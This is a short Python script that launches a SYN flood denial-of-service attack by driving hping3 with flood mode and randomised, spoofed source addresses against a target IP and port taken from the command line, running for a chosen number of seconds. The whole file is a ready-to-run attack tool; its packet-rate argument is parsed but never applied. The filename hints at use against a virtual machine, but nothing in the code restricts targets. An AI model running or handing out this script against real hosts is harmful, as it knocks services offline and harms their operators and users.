import subprocess
import sys
import time

def synFlood(ip, port, pps, duration):
    try:
        print(f"[INFO] Starting SYN Flood on {ip}:{port} at {pps} pps for {duration} seconds...")

        #use hping3
        cmd = [
            "sudo", "hping3", "-S", "--flood", "-p", str(port), "--rand-source", ip
        ]

        #use cmd as subprocess
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        #run @ duration
        time.sleep(duration)
        process.terminate()

        print("[INFO] Attack completed!")
    except Exception as e:
        print(f"[ERROR] Attack failed because: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 synAtkVm.py <ip> <port> <pps> <duration>")
        sys.exit(1)

    targetIp = sys.argv[1]
    targetPort = int(sys.argv[2])
    packetRate = int(sys.argv[3])
    duration = int(sys.argv[4])

    synFlood(targetIp, targetPort, packetRate, duration)